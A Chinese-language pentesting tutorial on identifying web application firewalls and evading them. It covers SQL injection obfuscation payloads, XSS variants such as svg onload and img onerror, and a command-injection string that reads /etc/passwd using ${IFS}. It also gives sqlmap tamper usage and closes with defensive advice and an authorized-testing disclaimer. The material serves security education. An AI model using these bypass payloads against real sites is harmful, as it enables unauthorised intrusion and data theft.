---
title: Web 流量绕过：WAF 识别与 Bypass 实战
slug: kali-4-waf绕过实战-8h9i0
date: 2026-09-12
visibility: public
tags: [Kali Linux, WAF, Web安全, 绕过, 渗透测试]
category: 渗透测试
---

# Web 流量绕过：WAF 识别与 Bypass 实战

> 越来越多的网站部署了 **WAF（Web 应用防火墙）**，直接注入大概率被拦截。WAF 绕过是 Web 渗透进阶的必修课。本文讲 WAF 识别、绕过思路与实战姿势。

## 一、WAF 是什么

WAF = 在 Web 服务器前拦截恶意请求的防火墙（规则/语义检测）。

```
[攻击者] → [WAF] → [Web服务器]
            拦截 SQLi/XSS/命令注入
```

## 二、WAF 识别

### 手工识别

```bash
# 发送可疑请求，看响应特征
curl -s "http://target/?id=1' AND '1'='1" -H "User-Agent: Mozilla/5.0"

# 看响应头（WAF 特征头）
curl -I http://target/
# X-Security / Server: cloudflare / 403 页面
```

### 工具识别

```bash
# 一键识别 WAF
whatwaf
wafw00f http://target.com
```

输出示例：`The site is behind Cloudflare, Alibaba Cloud WAF...`

## 三、通用绕过思路

### 1. 大小写与编码

```bash
# 大小写混淆
' AND '1'='1  ->  AnD
# URL 编码
'  ->  %27
# 双重编码
%2527
# Unicode/十六进制
```

### 2. 注释符与拼接

```sql
'/**/OR/**/1=1
'/*!50000union*/ select 1,2,3
```

### 3. 请求变形

```bash
# 分块传输（CHUNKED）
# 协议混淆（HTTP/1.0 vs 1.1）
# 参数污染（?id=1&id=2）
# 垃圾参数（?id=1&x=123）
# 超大请求（截断检测）
```

### 4. 利用 WAF 白名单

```bash
# 路径白名单
# 用受信任域名（.js/.css/.png）
# 用户 Agent 白名单（googlebot）
```

## 四、实战姿势

### SQL 注入绕过

```sql
-- 传统： 1' OR 1=1--
-- 绕过： 1%27%20%4f%52%20%31%3d%31 --   （URL 编码 OR）
-- 注释： 1'/**/OR/**/1=1--
-- 等价： 1'||1='1
```

### XSS 绕过

```javascript
// <script>alert(1)</script>
// 拦截 → 变体：
// <svg/onload=alert(1)>
// <img src=x onerror=alert(1)>
// <body onpageshow=alert(1)>
// javascript:alert(1)（URL 编码）
```

### 命令注入绕过

```bash
# 空格 → ${IFS}
?cmd=cat${IFS}/etc/passwd
# 用反引号 / $()
# 用通配符：/???/????
```

## 五、专用绕过工具

| 工具 | 用途 |
|------|------|
| sqlmap --tamper | 自动生成绕过 payload |
| burp | 手工改包 |
| moses / byepass | 自动化绕过 |
| 手工脚本 | 轮换 payload |

```bash
# sqlmap 使用 tamper 脚本绕过
sqlmap -u "http://target/?id=1" --tamper=space2comment,randomcase
```

## 六、防护建议（蓝队视角）

- 语义分析（AST 解析）而非正则
- 多维度检测（参数、Body、Header、频率）
- 上线前测试绕过路径
- WAF + 行为分析结合

## 安全合规

> WAF 绕过技术仅用于**授权测试**。帮助绕过安全设备攻击他人网站属违法行为。

## 小结

- 先识别 WAF 再绕（wafw00f 是第一步）
- 绕过三大类：编码变形、请求变形、利用白名单
- sqlmap tamper 是 SQL 注入绕过的自动化利器
- 蓝队用语义分析对抗绕过
- 绕过能力 = 对 HTTP 协议与检测逻辑的理解

> 下一篇：API 安全测试——从文档挖掘到越权。